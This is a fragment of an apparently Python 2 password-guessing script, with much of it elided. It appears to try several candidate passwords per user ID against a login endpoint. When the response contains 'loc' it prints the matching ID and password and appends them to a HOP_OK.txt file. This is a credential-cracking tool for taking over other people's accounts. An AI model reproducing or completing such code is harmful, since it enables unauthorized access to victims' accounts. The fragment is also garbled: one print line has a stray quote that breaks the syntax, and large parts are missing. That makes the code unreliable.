...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;96m[Alex-Cp] \x1b[1;96m' + uid + ' | ' + pass1 + '\x1b[0;96m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;96m[Alex-Cp] \x1b[1;96m' + uid + ' | ' + pass2 + '\x1b[0;96m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;96m[Alex-'Cp] \x1b[1;96m' + uid + ' | ' + pass3 + '\x1b[0;96m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
